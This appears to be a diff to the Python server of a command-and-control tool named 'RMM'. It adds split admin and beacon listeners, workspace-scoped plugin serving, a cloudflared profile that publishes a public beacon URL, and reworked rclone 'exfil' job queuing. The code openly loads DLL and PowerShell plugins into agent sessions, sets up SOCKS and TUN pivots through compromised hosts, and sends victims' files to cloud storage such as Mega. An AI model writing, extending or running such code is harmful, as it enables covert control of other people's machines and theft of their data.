@@ -37,6 +37,8 @@ import subprocess
 import shlex
 import zipfile
 import json
+import tempfile
+from typing import Any
 
 try:
     from prompt_toolkit.completion import Completer as _PTCompleterBase
@@ -52,16 +54,19 @@ from rmm_socks import (
 )
 from rmm_tun import TunError, TunManager, normalize_tun_config
 from rmm_workspace import WorkspaceEventBroker, WorkspaceRegistry, valid_workspace_id
+from rmm_asset_store import AssetError, AssetStore
+from rmm_profile import ProfileError, ProfileManager, profile_directory
 from rmm_rclone import (
     RcloneConfigError,
     get_rclone_max_bytes,
     RCLONE_BIN_PATH,
-    DEFAULT_PROFILE,
+    build_exfil_payload,
     build_exfil_command,
-    get_profile,
-    profile_to_plugin_settings,
-    resolve_dest_path,
-    RCLONE_REMOTE_NAME,
+    build_exfil_command_from_payload,
+    build_plugin_exfil_job,
+    RCLONE_TOOLS_URL,
+    get_rclone_default_profile,
+    load_profiles,
     rclone_binary_available,
     rclone_public_config,
 )
@@ -71,7 +76,15 @@ GO_TUN_PLUGIN_FILE = "tun.dll"
 HISTORY_FILE = os.path.expanduser("~/.RMM_history")
 
 # Configuration (overridden by argparse in main())
-PORT = 8080
+PORT = 8080  # Backward-compatible alias for the administration port.
+try:
+    ADMIN_PORT = int(os.environ.get("RMM_ADMIN_PORT", str(PORT)))
+except (TypeError, ValueError):
+    ADMIN_PORT = PORT
+try:
+    BEACON_PORT = int(os.environ.get("RMM_BEACON_PORT", "8081"))
+except (TypeError, ValueError):
+    BEACON_PORT = 8081
 LOG_DIR = "RMM_logs"
 WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web")
 SERVER_TOOLS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools")
@@ -80,17 +93,14 @@ CLIENT_SCRIPT = os.path.join(
 )
 GO_AGENT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent-go")
 GO_AGENT_BUILD_DIR = os.path.join(LOG_DIR, "agent-builds")
-AGENT_PLUGINS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent-plugins")
-# Operator PE plugins served to the Go agent; override with RMM_PLUGINS_DIR.
+# Operator PE and script plugins served to the agent. Deploy release artifacts
+# here from the external Minimal-RMM-plugins repository.
 PLUGINS_DIR = os.environ.get("RMM_PLUGINS_DIR", "").strip() or os.path.join(LOG_DIR, "plugins")
-POWERSHELL_SOCKS_PLUGIN = os.path.join(AGENT_PLUGINS_DIR, "socks-powershell", "socks.ps1")
-POWERSHELL_SCREENSHOT_PLUGIN = os.path.join(
-    AGENT_PLUGINS_DIR, "screenshot-powershell", "screenshot.ps1"
-)
+ASSETS_DIR = os.environ.get("RMM_ASSETS_DIR", "").strip() or os.path.join(LOG_DIR, "assets")
 PLUGIN_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$")
+PLUGIN_ARTIFACT_EXTENSIONS = {".dll", ".ps1"}
 PLUGIN_EXPORT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,127}$")
-# Cross compiler used for server-side Go PE plugin builds (CGO c-shared).
-PLUGIN_CC = os.environ.get("RMM_PLUGIN_CC", "x86_64-w64-mingw32-gcc").strip()
+PLUGIN_COMMAND_RE = re.compile(r"^[A-Za-z][A-Za-z0-9._-]{0,127}$")
 TUN_HELPER = os.environ.get("RMM_TUN_HELPER", "").strip() or os.path.join(SERVER_TOOLS_DIR, "rmm-tun")
 SESSION_FILE = os.path.join(LOG_DIR, "sessions.json")
 HISTORY_DIR = os.path.join(LOG_DIR, "history")
@@ -106,6 +116,8 @@ API_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()
 BEACON_SECRET = os.environ.get("RMM_BEACON_SECRET", "").strip()
 INSECURE = False
 LISTEN_HOST = "127.0.0.1"
+BEACON_BIND = os.environ.get("RMM_BEACON_BIND", "").strip() or LISTEN_HOST
+BEACON_PUBLIC_URL = os.environ.get("RMM_BEACON_PUBLIC_URL", "").strip()
 MAX_RESULT_EVENTS = 500
 MAX_AI_CHAT_MESSAGES = 500
 # Cap event body size on operator WebSocket pushes (full text stays in memory/history/API).
@@ -194,38 +206,56 @@ def safe_join_under(base_dir: str, *parts: str) -> str:
     return path
 
 
-def plugin_directory() -> str:
-    """Return the operator PE plugin directory, creating it on first use."""
-    os.makedirs(PLUGINS_DIR, exist_ok=True)
-    return PLUGINS_DIR
+def write_atomic_bytes(path: str, content: bytes) -> None:
+    """Write runtime bytes atomically so agents never read a partial artifact."""
+    directory = os.path.dirname(path)
+    os.makedirs(directory, exist_ok=True)
+    fd, temporary = tempfile.mkstemp(prefix=".rmm-asset-", dir=directory)
+    try:
+        with os.fdopen(fd, "wb") as handle:
+            handle.write(content)
+        os.chmod(temporary, 0o600)
+        os.replace(temporary, path)
+    finally:
+        try:
+            os.unlink(temporary)
+        except FileNotFoundError:
+            pass
 
 
-def plugin_script_path(name: str) -> str | None:
-    """Return the checked-in PowerShell script plugin path for a supported name."""
-    path_value = {
-        "socks.ps1": POWERSHELL_SOCKS_PLUGIN,
-        "screenshot.ps1": POWERSHELL_SCREENSHOT_PLUGIN,
-    }.get(name)
-    if not path_value:
+def plugin_directory(workspace_id: str | None = None) -> str:
+    """Return a runtime PE plugin directory, optionally scoped to a workspace."""
+    base = PLUGINS_DIR
+    if workspace_id and valid_workspace_id(str(workspace_id)):
+        base = os.path.join(base, "workspaces", str(workspace_id))
+    os.makedirs(base, exist_ok=True)
+    return base
+
+
+def plugin_script_path(name: str, workspace_id: str | None = None) -> str | None:
+    """Return a deployed PowerShell plugin artifact for a supported name."""
+    if name not in {"socks.ps1", "screenshot.ps1"}:
         return None
-    path = os.path.realpath(path_value)
-    source_root = os.path.realpath(AGENT_PLUGINS_DIR)
-    if path == source_root or not path.startswith(source_root + os.sep):
+    try:
+        path = safe_join_under(plugin_directory(workspace_id), name)
+    except ValueError:
         return None
     return path if os.path.isfile(path) else None
 
 
-def list_plugin_files() -> list[dict]:
-    """List PE plugins available to the Go agent with size and SHA-256."""
+def _list_plugin_files_in(directory: str) -> list[dict]:
+    """List supported plugin artifacts in one directory."""
     try:
-        names = sorted(os.listdir(plugin_directory()))
+        names = sorted(os.listdir(directory))
     except OSError:
         return []
     plugins = []
     for name in names:
         if not PLUGIN_NAME_RE.match(name):
             continue
-        path = os.path.join(plugin_directory(), name)
+        if os.path.splitext(name)[1].lower() not in PLUGIN_ARTIFACT_EXTENSIONS:
+            continue
+        path = os.path.join(directory, name)
         if not os.path.isfile(path):
             continue
         digest = hashlib.sha256()
@@ -241,6 +271,61 @@ def list_plugin_files() -> list[dict]:
     return plugins
 
 
+def list_plugin_files(workspace_id: str | None = None) -> list[dict]:
+    """List global and workspace PE plugins with workspace files taking precedence."""
+    global_rows = {
+        row["name"]: row
+        for row in _list_plugin_files_in(plugin_directory())
+        if asset_store().enabled("plugins", row["name"], True)
+    }
+    rows = global_rows
+    if workspace_id:
+        rows.update({row["name"]: row for row in _list_plugin_files_in(plugin_directory(workspace_id))})
+    return [rows[name] for name in sorted(rows)]
+
+
+def asset_store() -> AssetStore:
+    """Return the central persistent dynamic asset store."""
+    return AssetStore(ASSETS_DIR)
+
+
+def _workspace_plugin_path(workspace_id: str, name: str) -> str | None:
+    """Resolve a workspace plugin runtime cache path."""
+    if not valid_workspace_id(str(workspace_id)) or not PLUGIN_NAME_RE.fullmatch(name):
+        return None
+    try:
+        return safe_join_under(plugin_directory(workspace_id), name)
+    except ValueError:
+        return None
+
+
+def plugin_path_for_session(
+    name: str,
+    session_id: str | None = None,
+    server: object | None = None,
+) -> str | None:
+    """Resolve a plugin from a session workspace first, then the global store."""
+    if not PLUGIN_NAME_RE.fullmatch(str(name or "")):
+        return None
+    session = None
+    if session_id:
+        try:
+            owner = server or RMMHandler.server_instance
+            session = owner.get_session(session_id) if owner else None
+        except (AttributeError, TypeError):
+            session = None
+    workspace_id = getattr(session, "workspace_id", None) if session else None
+    if workspace_id:
+        path = _workspace_plugin_path(workspace_id, name)
+        if path and os.path.isfile(path):
+            return path
+    try:
+        path = safe_join_under(plugin_directory(), name)
+    except ValueError:
+        return None
+    return path if os.path.isfile(path) else None
+
+
 def plugin_command_metadata(command: str, agent_type: str | None = None) -> dict | None:
     """Extract safe plugin identity metadata from a queued agent command."""
     fields = str(command or "").split("\n", 1)[0].split(None, 3)
@@ -248,119 +333,16 @@ def plugin_command_metadata(command: str, agent_type: str | None = None) -> dict
         plugin = "screenshot.ps1" if str(agent_type or "").strip().lower() == "powershell" else "screenshot.dll"
         return {"plugin": plugin, "export": "Run"}
     if len(fields) < 3 or fields[0] != "__PE_LOAD__":
-        return None
+        if len(fields) < 3 or fields[0] != "__PLUGIN_COMMAND__":
+            return None
+        plugin, plugin_command = fields[1], fields[2]
+        if not PLUGIN_NAME_RE.fullmatch(plugin) or not PLUGIN_COMMAND_RE.fullmatch(plugin_command):
+            return None
+        return {"plugin": plugin, "command": plugin_command, "export": "Run"}
     plugin, export = fields[1], fields[2]
     if not PLUGIN_NAME_RE.fullmatch(plugin) or not PLUGIN_EXPORT_RE.fullmatch(export):
         return None
     return {"plugin": plugin, "export": export}
-
-
-# Cross-compile timeout for server-side Go PE plugin builds. Override with
-# RMM_PLUGIN_BUILD_TIMEOUT. The first rclone-based build far exceeds the
-# agent's 120-second budget because every backend is compiled once.
-PLUGIN_BUILD_TIMEOUT = _env_int("RMM_PLUGIN_BUILD_TIMEOUT", 600)
-
-
-def plugin_build_targets() -> list[str]:
-    """Return checked-in Go plugin directories available for server builds."""
-    if not os.path.isdir(AGENT_PLUGINS_DIR):
-        return []
-    targets = []
-    for name in sorted(os.listdir(AGENT_PLUGINS_DIR)):
-        if os.path.isfile(os.path.join(AGENT_PLUGINS_DIR, name, "go.mod")):
-            targets.append(name)
-    return targets
-
-
-def plugin_toolchain() -> dict:
-    """Report whether the server can cross-compile Go PE plugins."""
-    return {
-        "go": bool(shutil.which("go")),
-        "cross_compiler": bool(shutil.which(PLUGIN_CC)),
-        "cross_compiler_name": PLUGIN_CC,
-    }
-
-
-_plugin_build_lock = threading.Lock()
-
-
-def build_plugin(name: str, output: str | None = None) -> dict:
-    """Cross-compile one checked-in Go plugin into the server plugin directory.
-
-    Only repository source under agent-plugins/ is ever built; the output
-    artifact is served to Go agents immediately from the plugin directory.
-    """
-    name = str(name or "").strip()
-    if name not in plugin_build_targets():
-        raise ValueError("unknown plugin target")
-    go_bin = shutil.which("go")
-    if not go_bin:
-        raise RuntimeError("Go toolchain is not installed on the RMM server")
-    if not shutil.which(PLUGIN_CC):
-        raise RuntimeError(f"plugin cross compiler {PLUGIN_CC} is not installed on the RMM server")
-    output = str(output or "").strip() or f"{name}.dll"
-    if not output.lower().endswith(".dll") or not PLUGIN_NAME_RE.match(output):
-        raise ValueError("invalid plugin output name")
-    source_dir = safe_join_under(AGENT_PLUGINS_DIR, name)
-    go_cache = safe_join_under(LOG_DIR, "go-cache")
-    go_mod_cache = safe_join_under(LOG_DIR, "go-mod-cache")
-    os.makedirs(go_cache, exist_ok=True)
-    os.makedirs(go_mod_cache, exist_ok=True)
-    artifact_dir = plugin_directory()
-    artifact_path = safe_join_under(artifact_dir, output)
-    # Leading dot keeps the staging file out of the plugin listing on failure.
-    staging_path = safe_join_under(artifact_dir, f".build-{output}.tmp")
-    env = os.environ.copy()
-    env.update(
-        {
-            "CGO_ENABLED": "1",
-            "GOOS": "windows",
-            "GOARCH": "amd64",
-            "GO111MODULE": "on",
-            "CC": PLUGIN_CC,
-            "GOCACHE": go_cache,
-            "GOMODCACHE": go_mod_cache,
-        }
-    )
-    with _plugin_build_lock:
-        try:
-            completed = subprocess.run(
-                [
-                    go_bin,
-                    "build",
-                    "-trimpath",
-                    "-ldflags",
-                    "-s -w",
-                    "-buildmode=c-shared",
-                    "-o",
-                    staging_path,
-                    ".",
-                ],
-                cwd=source_dir,
-                env=env,
-                capture_output=True,
-                text=True,
-                timeout=PLUGIN_BUILD_TIMEOUT,
-                check=False,
-            )
-        except subprocess.TimeoutExpired as exc:
-            raise RuntimeError(f"plugin build timed out after {PLUGIN_BUILD_TIMEOUT} seconds") from exc
-        if completed.returncode != 0:
-            if os.path.exists(staging_path):
-                try:
-                    os.remove(staging_path)
-                except OSError:
-                    pass
-            detail = (completed.stderr or completed.stdout or "build failed").strip()
-            raise RuntimeError(detail[-4000:])
-        os.replace(staging_path, artifact_path)
-    digest = hashlib.sha256()
-    size = 0
-    with open(artifact_path, "rb") as handle:
-        for chunk in iter(lambda: handle.read(65536), b""):
-            digest.update(chunk)
-            size += len(chunk)
-    return {"ok": True, "name": name, "output": output, "size": size, "sha256": digest.hexdigest()}
 
 
 GO_AGENT_TARGETS = {
@@ -377,6 +359,8 @@ def go_agent_source_files() -> list[dict[str, str]]:
     files = []
     for current, _dirs, names in os.walk(root):
         for name in sorted(names):
+            if name.endswith("_test.go"):
+                continue
             if not (name.endswith(".go") or name in ("go.mod", "go.sum")):
                 continue
             path = os.path.realpath(os.path.join(current, name))
@@ -861,6 +845,11 @@ class RMMServer:
         self.socks = SocksManager(log_fn=self.log)
         self.tun_transport = SocksManager(log_fn=self.log)
         self.tun = TunManager(TUN_HELPER, self.tun_transport, log_fn=self.log)
+        self.admin_port = ADMIN_PORT
+        self.beacon_port = BEACON_PORT
+        self.beacon_public_url = BEACON_PUBLIC_URL
+        self.profile_manager = ProfileManager(profile_directory(), log_fn=self.log)
+        self.profile_name = os.environ.get("RMM_PROFILE_NAME", "cloudflared").strip().lower()
         # In workspace mode this stores transport-only relay configuration;
         # the workspace service creates the listener or TUN device locally.
         self.workspace_socks_configs = {}
@@ -869,6 +858,92 @@ class RMMServer:
         self._sessions_broadcast_timer = None
         if self.storage_mode == "server":
             self._archive_orphaned_sessions_on_startup()
+
+    def set_listener_ports(self, admin_port: int, beacon_port: int) -> None:
+        """Record the bound administration and beacon ports for generated agents."""
+        self.admin_port = int(admin_port)
+        self.beacon_port = int(beacon_port)
+
+    def profile_status(self) -> dict[str, Any]:
+        """Return safe RMM-Profile and beacon transport status."""
+        status = self.profile_manager.status()
+        status["beacon_port"] = self.beacon_port
+        status["beacon_public_url"] = self.beacon_public_url or None
+        status["profile_name"] = self.profile_name or None
+        return status
+
+    def start_profile(self, name: str | None = None, config: dict[str, Any] | None = None) -> dict[str, Any]:
+        """Start a dynamic profile and publish the URL agents must use."""
+        selected = (name or self.profile_name or "").strip().lower()
+        if not selected:
+            raise ProfileError("profile name is required")
+        event = self.profile_manager.start(
+            selected,
+            listen_host="127.0.0.1" if BEACON_BIND in {"0.0.0.0", "::", ""} else BEACON_BIND,
+            listen_port=self.beacon_port,
+            config=config,
+        )
+        self.profile_name = selected
+        self.beacon_public_url = str(event.get("public_url") or "").rstrip("/")
+        self.log(f"RMM-Profile {selected} ready: {self.beacon_public_url}", "SUCCESS")
+        return self.profile_status()
+
+    def stop_profile(self) -> bool:
+        """Stop the active profile and clear its public agent URL."""
+        stopped = self.profile_manager.stop()
+        self.beacon_public_url = BEACON_PUBLIC_URL
+        return stopped
+
+    def skill_directories(self) -> list[str]:
+        """Return built-in and centrally managed skill directories."""
+        return [
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), "ai-skills"),
+            os.path.join(ASSETS_DIR, "skills"),
+        ]
+
+    def skill_overrides(self) -> dict[str, bool]:
+        """Return central dynamic skill enablement flags."""
+        flags = asset_store().flags("skills")
+        for name, enabled in list(flags.items()):
+            if name.lower().endswith(".md"):
+                flags.setdefault(os.path.splitext(name)[0].lower(), enabled)
+        return flags
+
+    def list_ai_skills(self) -> list[dict]:
+        """Return built-in and uploaded AI skill metadata."""
+        from rmm_ai_skills import list_ai_skills
+
+        return list_ai_skills(self.skill_directories(), self.skill_overrides())
+
+    def rclone_profiles(self) -> dict[str, dict]:
+        """Return configured and enabled central rclone profiles."""
+        profiles = load_profiles()
+        store = asset_store()
+        for row in store.list("rclone", include_disabled=False):
+            try:
+                payload = json.loads(store.read("rclone", row["name"]))
+            except (AssetError, json.JSONDecodeError):
+                continue
+            if not isinstance(payload, dict):
+                continue
+            if payload.get("type"):
+                profiles[str(payload.get("name") or os.path.splitext(row["name"])[0])] = payload
+            else:
+                profiles.update(
+                    {str(name): profile for name, profile in payload.items() if isinstance(profile, dict) and profile.get("type")}
+                )
+        return profiles
+
+    def rclone_config(self) -> dict[str, Any]:
+        """Return operator-safe central rclone status with dynamic assets."""
+        config = rclone_public_config(profiles=self.rclone_profiles())
+        config["rclone_plugin"] = next(
+            (item for item in list_plugin_files()
+             if item.get("name", "").lower().startswith("rclone-exfil")
+             and item.get("name", "").lower().endswith(".dll")),
+            None,
+        )
+        return config
 
     @staticmethod
     def _format_ago(seconds):
@@ -1367,6 +1442,54 @@ class RMMServer:
         self.note_download_queued(session, remote_path)
         return cmd
 
+    def queue_workspace_exfil(
+        self,
+        session,
+        workspace_job: dict,
+        mode: str = "auto",
+    ) -> str:
+        """Queue an exfil job assembled by the session's operator workspace."""
+        if self.storage_mode != "workspace" or not getattr(session, "workspace_id", None):
+            raise RcloneConfigError("workspace rclone jobs require workspace storage mode")
+        if not isinstance(workspace_job, dict):
+            raise RcloneConfigError("workspace rclone job is missing")
+        mode = (mode or "auto").strip().lower()
+        if mode not in {"auto", "plugin", "binary"}:
+            raise ValueError("exfil mode must be auto, plugin, or binary")
+
+        plugin_name = next(
+            (item["name"] for item in list_plugin_files(getattr(session, "workspace_id", None))
+             if item.get("name", "").lower().startswith("rclone-exfil")
+             and item.get("name", "").lower().endswith(".dll")),
+            None,
+        )
+        plugin_ready = bool(plugin_name and session.agent_type == "go" and "pe" in session.capabilities)
+        if mode in {"auto", "plugin"} and plugin_ready:
+            plugin_job = workspace_job.get("plugin_job")
+            if not isinstance(plugin_job, dict) or str(plugin_job.get("source") or "").strip() == "":
+                raise RcloneConfigError("workspace plugin job is missing")
+            if not isinstance(plugin_job.get("settings"), dict) or not plugin_job.get("backend"):
+                raise RcloneConfigError("workspace plugin job is invalid")
+            cmd = f"__PE_LOAD__ {plugin_name} Run {json.dumps(plugin_job, separators=(',', ':'))}"
+            self.set_command(session.id, cmd, "oneshot")
+            return cmd
+        if mode == "plugin":
+            raise ValueError("rclone plugin unavailable for this agent or server")
+
+        payload = workspace_job.get("binary_payload")
+        if not isinstance(payload, dict) or not str(payload.get("local_path") or "").strip():
+            raise RcloneConfigError("workspace binary exfil payload is missing")
+        if not rclone_binary_available():
+            raise ValueError(
+                f"rclone binary not found — place rclone.exe at {RCLONE_BIN_PATH} "
+                "or set RMM_RCLONE_BIN on the central control plane"
+            )
+        payload = dict(payload)
+        payload["rclone_url"] = RCLONE_TOOLS_URL
+        cmd = build_exfil_command_from_payload(payload)
+        self.set_command(session.id, cmd, "oneshot")
+        return cmd
+
     def queue_agent_exfil(
         self,
         session,
@@ -1374,29 +1497,33 @@ class RMMServer:
         profile_name: str,
         dest: str | None = None,
         mode: str = "auto",
+        workspace_job: dict | None = None,
     ) -> str:
         """Queue exfil using the selected plugin or binary execution mode."""
         mode = (mode or "auto").strip().lower()
         if mode not in {"auto", "plugin", "binary"}:
             raise ValueError("exfil mode must be auto, plugin, or binary")
+        if self.storage_mode == "workspace":
+            if workspace_job is None:
+                raise RcloneConfigError(
+                    "workspace rclone configuration must be loaded by the operator workspace"
+                )
+            return self.queue_workspace_exfil(session, workspace_job, mode=mode)
         plugin_name = next(
-            (item["name"] for item in list_plugin_files()
+            (item["name"] for item in list_plugin_files(getattr(session, "workspace_id", None))
              if item.get("name", "").lower().startswith("rclone-exfil")
              and item.get("name", "").lower().endswith(".dll")),
             None,
         )
         plugin_ready = bool(plugin_name and session.agent_type == "go" and "pe" in session.capabilities)
         if mode in {"auto", "plugin"} and plugin_ready:
-            profile = get_profile(profile_name)
-            plugin_job = {
-                "source": remote_path,
-                "account": RCLONE_REMOTE_NAME,
-                "backend": profile.get("type"),
-                "target": resolve_dest_path(profile, remote_path, dest),
-                "settings": profile_to_plugin_settings(profile),
-                "make_link": bool(profile.get("type") == "mega"),
-                "max_minutes": 30,
-            }
+            plugin_job = build_plugin_exfil_job(
+                remote_path,
+                profile_name,
+                dest=dest,
+                profiles=self.rclone_profiles(),
+                max_bytes=get_rclone_max_bytes(),
+            )
             cmd = f"__PE_LOAD__ {plugin_name} Run {json.dumps(plugin_job, separators=(',', ':'))}"
             self.set_command(session.id, cmd, "oneshot")
             return cmd
@@ -1408,7 +1535,14 @@ class RMMServer:
                 f"rclone binary not found — place rclone.exe at {RCLONE_BIN_PATH} "
                 "or set RMM_RCLONE_BIN"
             )
-        cmd = build_exfil_command(remote_path, profile_name, dest=dest)
+        payload = build_exfil_payload(
+            remote_path,
+            profile_name,
+            dest=dest,
+            profiles=self.rclone_profiles(),
+            max_bytes=get_rclone_max_bytes(),
+        )
+        cmd = build_exfil_command_from_payload(payload)
         self.set_command(session.id, cmd, "oneshot")
         return cmd
 
@@ -1959,17 +2093,16 @@ class RMMServer:
         if agent_type == "go":
             if "socks-plugin" not in capabilities:
                 return "the Go agent does not advertise socks-plugin support"
-            try:
-                plugin_path = safe_join_under(plugin_directory(), GO_SOCKS_PLUGIN_FILE)
-            except ValueError:
-                return "the Go SOCKS plugin path is invalid"
-            if not os.path.isfile(plugin_path):
+            plugin_path = plugin_path_for_session(GO_SOCKS_PLUGIN_FILE, getattr(session, "id", None))
+            if not plugin_path:
                 return (
-                    "build the socks plugin first "
-                    "(POST /api/v1/plugins/build with name=socks)"
+                    "install socks.dll from the external plugin bundle into "
+                    "RMM_PLUGINS_DIR"
                 )
-        elif agent_type == "powershell" and plugin_script_path("socks.ps1") is None:
-            return "the PowerShell SOCKS plugin is missing from the repository"
+        elif agent_type == "powershell" and not plugin_path_for_session(
+            "socks.ps1", getattr(session, "id", None)
+        ):
+            return "the deployed PowerShell SOCKS plugin is missing from RMM_PLUGINS_DIR"
         elif agent_type != "powershell":
             return f"no SOCKS pivot plugin is available for agent type {agent_type or 'unknown'}"
         return None
@@ -2015,19 +2148,15 @@ class RMMServer:
         return rows
 
     def tun_plugin_error(self, session) -> str | None:
-        """Return a readiness error for the built-in server-side TUN pivot."""
+        """Return a readiness error for the RMM-owned TUN pivot."""
         agent_type = str(getattr(session, "agent_type", "")).lower()
         capabilities = {str(item).lower() for item in getattr(session, "capabilities", [])}
         if agent_type != "go":
             return f"the TUN pivot currently requires a Go agent, got {agent_type or 'unknown'}"
         if "tun-plugin" not in capabilities:
             return "the Go agent does not advertise tun-plugin support"
-        try:
-            plugin_path = safe_join_under(plugin_directory(), GO_TUN_PLUGIN_FILE)
-        except ValueError:
-            return "the Go TUN plugin path is invalid"
-        if not os.path.isfile(plugin_path):
-            return "build the TUN plugin first (POST /api/v1/plugins/build with name=tun)"
+        if not plugin_path_for_session(GO_TUN_PLUGIN_FILE, getattr(session, "id", None)):
+            return "install tun.dll from the external plugin bundle into RMM_PLUGINS_DIR"
         if self.storage_mode != "workspace" and (not os.path.isfile(TUN_HELPER) or not os.access(TUN_HELPER, os.X_OK)):
             return f"build the server TUN helper first (make tun-build; expected {TUN_HELPER})"
         return None
@@ -2289,9 +2418,14 @@ class RMMServer:
             else:
                 session.cmd_queue.append(command)
         if plugin_meta:
+            command_label = (
+                f" command={plugin_meta['command']}"
+                if plugin_meta.get("command")
+                else ""
+            )
             self.log(
                 f"Plugin queued: session={session.id[:8]} plugin={plugin_meta['plugin']} "
-                f"export={plugin_meta['export']} mode={cmd_type}",
+                f"export={plugin_meta['export']}{command_label} mode={cmd_type}",
                 "CMD",
             )
         return True
@@ -2331,9 +2465,14 @@ class RMMServer:
             if plugin_meta and response[1] in ("execute", "persistent"):
                 plugin_meta["started_at"] = time.monotonic()
                 session.pending_plugin_runs.append(plugin_meta)
+                command_label = (
+                    f" command={plugin_meta['command']}"
+                    if plugin_meta.get("command")
+                    else ""
+                )
                 dispatch_log = (
                     f"Plugin dispatched: session={session.id[:8]} plugin={plugin_meta['plugin']} "
-                    f"export={plugin_meta['export']}"
+                    f"export={plugin_meta['export']}{command_label}"
                 )
         if dispatch_log:
             self.log(dispatch_log, "INFO")
@@ -2572,9 +2711,14 @@ class RMMServer:
             )
             status = "failed" if plugin_result_failed else "completed"
             level = "ERROR" if plugin_result_failed else "SUCCESS"
+            command_label = (
+                f" command={plugin_meta['command']}"
+                if plugin_meta.get("command")
+                else ""
+            )
             self.log(
                 f"Plugin {status}: session={session.id[:8]} plugin={plugin_meta['plugin']} "
-                f"export={plugin_meta['export']} result_type={cmd_type} "
+                f"export={plugin_meta['export']}{command_label} result_type={cmd_type} "
                 f"output_bytes={len(result)} elapsed_ms={elapsed_ms}",
                 level,
             )
@@ -2614,9 +2758,36 @@ def _resolve_api_session(handler, session_ref: str):
 
 class RMMHandler(BaseHTTPRequestHandler):
     server_instance = None
+    listener_role = "combined"
     
     def log_message(self, format, *args):
         pass
+
+    def _listener_role(self) -> str:
+        """Return the role of the listener that accepted this request."""
+        return str(getattr(self, "listener_role", "") or getattr(getattr(self, "server", None), "listener_role", "combined"))
+
+    def _path_allowed(self, path: str, *, method: str = "GET") -> bool:
+        """Keep administration and beacon routes off each other's listeners."""
+        role = self._listener_role()
+        if role == "combined":
+            return True
+        is_api = path.startswith(API_PREFIX)
+        is_web = path == "/" or path.startswith("/ui")
+        is_beacon = path in {
+            "/register",
+            "/cmd",
+            "/ping",
+            "/result",
+            "/socks",
+            "/socks-ws",
+            "/tun",
+        } or path == "/tools/rclone.exe" or path.startswith("/tools/plugins/")
+        if role == "admin":
+            return is_api or is_web
+        if role == "beacon":
+            return is_beacon
+        return False
 
     def handle(self):
         """Suppress BrokenPipe when clients close before reading the response."""
@@ -2891,18 +3062,18 @@ class RMMHandler(BaseHTTPRequestHandler):
         if not PLUGIN_NAME_RE.match(name):
             self._respond(400, "Invalid plugin name")
             return True
-        try:
-            path = safe_join_under(plugin_directory(), name)
-        except ValueError:
-            self._respond(400, "Invalid plugin name")
+        if os.path.splitext(name)[1].lower() not in PLUGIN_ARTIFACT_EXTENSIONS:
+            self._respond(404, "Unknown plugin")
             return True
-        content_type = "application/octet-stream"
-        if not os.path.isfile(path):
-            path = plugin_script_path(name)
-            if path is None:
-                self._respond(404, "Unknown plugin")
-                return True
-            content_type = "text/plain; charset=utf-8"
+        content_type = (
+            "text/plain; charset=utf-8"
+            if os.path.splitext(name)[1].lower() == ".ps1"
+            else "application/octet-stream"
+        )
+        path = plugin_path_for_session(name, session_id, getattr(self, "server_instance", None))
+        if path is None:
+            self._respond(404, "Unknown plugin")
+            return True
         with open(path, "rb") as handle:
             data = handle.read()
         self.send_response(200)
@@ -3020,15 +3191,28 @@ class RMMHandler(BaseHTTPRequestHandler):
             )
             return True
 
-        if parts == ["rclone", "config"]:
-            config = rclone_public_config()
-            config["rclone_plugin"] = next(
-                (item for item in list_plugin_files()
+        if parts == ["rclone", "capabilities"]:
+            plugin = next(
+                (item for item in list_plugin_files(workspace_id)
                  if item.get("name", "").lower().startswith("rclone-exfil")
                  and item.get("name", "").lower().endswith(".dll")),
                 None,
             )
-            self._json(200, config)
+            self._json(
+                200,
+                {
+                    "rclone_binary": rclone_binary_available(),
+                    "rclone_plugin": plugin,
+                    "workspace_local": srv.storage_mode == "workspace",
+                },
+            )
+            return True
+
+        if parts == ["rclone", "config"]:
+            if srv.storage_mode == "workspace":
+                self._json(409, {"error": "rclone_config_is_workspace_local"})
+                return True
+            self._json(200, srv.rclone_config())
             return True
 
         if parts == ["health"]:
@@ -3036,7 +3220,17 @@ class RMMHandler(BaseHTTPRequestHandler):
                 count = len(srv.workspace_sessions(workspace_id))
             else:
                 count = len(srv.sessions)
-            self._json(200, {"status": "ok", "sessions": count, "storage_mode": srv.storage_mode})
+            self._json(
+                200,
+                {
+                    "status": "ok",
+                    "sessions": count,
+                    "storage_mode": srv.storage_mode,
+                    "admin_port": getattr(srv, "admin_port", ADMIN_PORT),
+                    "beacon_port": getattr(srv, "beacon_port", BEACON_PORT),
+                    "beacon_public_url": getattr(srv, "beacon_public_url", "") or None,
+                },
+            )
             return True
 
         if parts == ["agent", "script"]:
@@ -3148,10 +3342,31 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if parts == ["ai", "skills"]:
-            from rmm_ai_skills import ai_skills_dir, list_ai_skills
+            skills = srv.list_ai_skills()
+            self._json(
+                200,
+                {
+                    "skills": skills,
+                    "count": len(skills),
+                    "directory": srv.skill_directories(),
+                },
+            )
+            return True
 
-            skills = list_ai_skills()
-            self._json(200, {"skills": skills, "count": len(skills), "directory": ai_skills_dir()})
+        if parts == ["profile"]:
+            self._json(200, srv.profile_status())
+            return True
+
+        if parts == ["transport"]:
+            self._json(
+                200,
+                {
+                    "admin_url": self._operator_api_base_url(),
+                    "beacon_url": srv.beacon_public_url or f"http://127.0.0.1:{srv.beacon_port}",
+                    "beacon_port": srv.beacon_port,
+                    "profile": srv.profile_status(),
+                },
+            )
             return True
 
         if parts == ["history"]:
@@ -3197,11 +3412,23 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._json(
                 200,
                 {
-                    "plugins": list_plugin_files(),
-                    "targets": plugin_build_targets(),
-                    "toolchain": plugin_toolchain(),
+                    "plugins": list_plugin_files(workspace_id),
                 },
             )
+            return True
+
+        if parts == ["assets"]:
+            rows = asset_store().list()
+            self._json(200, {"assets": rows, "count": len(rows), "workspace_local": False})
+            return True
+
+        if len(parts) == 2 and parts[0] == "assets":
+            try:
+                rows = asset_store().list(parts[1])
+            except AssetError as exc:
+                self._json(400, {"error": str(exc)})
+                return True
+            self._json(200, {"assets": rows, "count": len(rows), "workspace_local": False})
             return True
 
         self._json(404, {"error": "not_found"})
@@ -3247,6 +3474,88 @@ class RMMHandler(BaseHTTPRequestHandler):
